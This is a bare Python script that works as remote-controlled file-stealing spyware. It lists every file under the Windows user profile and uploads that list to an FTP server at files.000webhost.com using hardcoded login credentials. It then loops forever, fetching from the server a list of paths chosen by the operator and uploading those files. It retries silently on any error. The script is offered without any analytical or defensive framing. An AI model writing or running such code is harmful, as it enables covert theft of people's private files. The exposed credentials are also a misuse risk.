import getpass
import ftplib
import datetime
import time
import random
import os

uname=""
ftp=ftplib.FTP()
fileName=""
logfile=open("LogFile.txt",'a')

def dirUpload():
    try:
        file=open("FileList.txt",'a')
        list1=[]
        for root, dirs, files in os.walk(os.environ['USERPROFILE']):
                for filename in files:
                    if(len(list1)!=500):
                        list1.append(root+"\\" + filename)
                    else:
                        print("Pasting..")
                        for i in list1:
                            file.write(i+"\r\n")
                        list1=[]    
        file.close()
        upload("FileList.txt")                    
    except Exception as e:
        logfile=open("LogFile.txt",'a')
        logfile.write(str(e))
        logfile.close()
        print("Retrying...")
        time.sleep(20)
        dirUpload()

    
def init():
    try:
        global ftp, fileName, uname,logfile
        uname = getpass.getuser()
        
        date = datetime.date.today().strftime("%B %d, %Y")
        fileName= uname+", "+date+".txt"
        
        dirExists()
    except Exception as e:
        logfile=open("LogFile.txt",'a')
        logfile.write(str(e))
        logfile.close()
        print("Retrying...")
        time.sleep(20)
        init()



def dirExists():
    try:
        global  filename, uname,logfile
        ftp = ftplib.FTP("files.000webhost.com","rajshreezade01","12345678")
        ftp.cwd("FileUploader/")
        files=[]
        files=ftp.nlst()
        if uname not in files:
            print("Creating Directory...")
            ftp.mkd(uname)
            print("Done")
        ftp.close()
    except Exception as e:
        logfile=open("LogFile.txt",'a')
        logfile.write(str(e))
        logfile.close()
        print("Retrying...")
        time.sleep(20)
        dirExists()



def upload(filePath):
    try:
        global  fileName, uname,logfile
        ftp = ftplib.FTP("files.000webhost.com","rajshreezade01","12345678")
        ftp.cwd("FileUploader/"+uname)
        if filePath != '' :
            file = open(fileName,'a')
            file.write("Done: "+filePath+"\n")
            file.close()
            try:
                file = open(filePath,'rb')
                ftp.storbinary('STOR '+filePath.split("\\").pop(),file)
                file.close()  # send the file
            except Exception as e:
                logfile.write(str(e))  
                file = open(fileName,'a')
                file.write("file not found: "+filePath+"\n")
                file.close()
            file = open(fileName,'a')
            file.write("Done: "+filePath+"\n")
            file.close()
            
                                  # close file and FTP
            ftp.quit()
        ftp.close()
    except Exception as e:
        logfile=open("LogFile.txt",'a')
        logfile.write(str(e))
        logfile.close()
        print("Retrying...")
        time.sleep(20)
        upload(filepath)


    
def strip(data):
    try:
        global fileName, uname,logfile
        ftp = ftplib.FTP("files.000webhost.com","rajshreezade01","12345678")
        ftp.cwd("FileUploader/"+uname)
        data=str(data)
        print("Raw Data")
        print(data)
        fileList=[]
        fileList=data.strip('b\'').split("\\r\\n")
        print("Files")
        for i in fileList:
            print(i)
            
        for i in fileList:
            
            if i.strip('b\'').startswith("Done")==False and i!='' and i.strip('b\'').startswith("file")==False :
                print("Uploading.."+i.strip("\r\n").strip('\r').strip('\n'))
                upload(i.strip("\r\n").strip('\r').strip('\n'))
                print("Uploaded")
        ftp.close()
    except Exception as e:
        logfile=open("LogFile.txt",'a')
        logfile.write(str(e))
        logfile.close()
        print("Retrying...")
        time.sleep(20)
        strip(data)



    
def read1():
    try:
        global fileName, uname,logfile
        file=open(fileName,'a')
        ftp = ftplib.FTP("files.000webhost.com","rajshreezade01","12345678")
        ftp.cwd("FileUploader/"+uname)
        try:
            ftp.retrbinary('RETR '+fileName,strip)
        except Exception as e:
            logfile=open("LogFile.txt",'a')
            logfile.write(str(e))
            logfile.close()
            print("Retrying...")
            time.sleep(20)
            ftp.retrbinary('RETR '+fileName,strip)


        ftp.close()
    except Exception as e:
        logfile=open("LogFile.txt",'a')
        logfile.write(str(e))
        logfile.close()
        print("Retrying...")
        time.sleep(20)
        read1()



def doAllocate(size):
    result=size*[None]
    count=0
    for i in range(size):

        message= str(random.randint(1,100))+"some unique object %d" % ( i, )

        result[i]= message

    return result


doAllocate(2621440)
print("Allocated")
init()
print("Uploading initial file")

try:
    upload(fileName)
except Exception as e:
    logfile=open("LogFile.txt",'a')
    logfile.write(str(e))
    logfile.close()
    print("Retrying...")
    time.sleep(20)
    upload()

print("Done")


try:
    dirUpload()
except Exception as e:
    logfile=open("LogFile.txt",'a')
    logfile.write(str(e))
    logfile.close()
    print("Retrying...")
    time.sleep(20)
    upload()


    
def looper():
    global logfile
    while(True):
        print("Reading...")
        try:
            read1()
            time.sleep(30)
            upload("logfile.txt")
            time.sleep(30)
        except Exception as e:
            logfile=open("LogFile.txt",'a')
            logfile.write(str(e))
            logfile.close()
            print("Retrying...")
            time.sleep(20)
            read1()

        time.sleep(10)

try:
    looper()
except Exception as e:  
    logfile=open("LogFile.txt",'a')
    logfile.write(str(e))
    logfile.close()
    print("Retrying...")
    time.sleep(20)
    looper()

